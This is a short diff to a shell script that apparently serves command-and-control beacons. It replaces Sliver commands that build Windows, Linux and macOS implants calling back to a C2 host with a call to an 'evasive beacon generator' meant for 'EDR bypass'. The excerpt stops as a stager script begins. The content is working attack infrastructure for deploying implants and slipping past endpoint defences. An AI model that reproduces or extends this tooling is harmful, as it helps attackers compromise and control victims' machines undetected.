@@ -14,24 +14,12 @@ umask 077
 mkdir -p $BEACONS_DIR
 
 # Function to generate beacons using Sliver
-generate_beacons() {
-    echo "[+] Generating beacons for all platforms..."
+# This will replace part of files/serve-beacons.sh
+function generate_beacons() {
+    echo "[+] Generating evasive beacons for all platforms..."
     
-    # Make sure Sliver server is running
-    if ! pgrep -x "sliver-server" > /dev/null; then
-        echo "[!] Sliver server is not running, starting it..."
-        systemctl start sliver
-        sleep 5
-    fi
-    
-    # Generate Windows beacon
-    sliver-cli generate --http $C2_HOST:8888 --os windows --arch amd64 --save $BEACONS_DIR/windows.exe
-    
-    # Generate Linux beacon
-    sliver-cli generate --http $C2_HOST:8888 --os linux --arch amd64 --save $BEACONS_DIR/linux
-    
-    # Generate macOS beacon
-    sliver-cli generate --http $C2_HOST:8888 --os darwin --arch amd64 --save $BEACONS_DIR/macos
+    # Use evasive beacon generator for better EDR bypass
+    /opt/c2/generate_evasive_beacons.sh $C2_HOST 8443
     
     # Generate stagers
     echo "#!/bin/bash
